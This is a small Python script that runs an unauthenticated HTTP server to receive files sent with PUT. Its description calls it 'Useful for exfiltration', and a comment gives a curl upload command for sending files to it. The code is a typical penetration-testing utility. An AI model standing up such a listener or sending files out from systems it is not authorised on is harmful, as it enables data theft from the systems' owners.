#!/usr/bin/env python3

# Server to upload files leveraging the HTTP PUT method
# Example to upload a file to the server using curl
# curl -T <file> <destination>

import argparse
from socketserver import TCPServer
from http.server import SimpleHTTPRequestHandler

class FileReceiverHTTPHandler(SimpleHTTPRequestHandler):

    def do_PUT(self):        
        length = int(self.headers["Content-Length"])
        path = self.translate_path(self.path)

        try:
            with open(path, "wb") as dst:
                dst.write(self.rfile.read(length))

            print(f"[+] File: {path}")
            
        except Exception as err:
            print(f"Unexpected {err=}, {type(err)=}")

if __name__ == '__main__':
    parser = argparse.ArgumentParser(
        prog = 'File Receiver - HTTP Server',
        description = 'HTTP Server to upload files though the PUT method. Useful for exfiltration.'
    )

    parser.add_argument('-p', '--port', default=8080, type=int, help='Port where the server will be listening for incoming files.')

    args = parser.parse_args()

    PORT = args.port

    with TCPServer(("", PORT), FileReceiverHTTPHandler) as httpd:
        print("Listening on port", PORT)
        httpd.serve_forever()
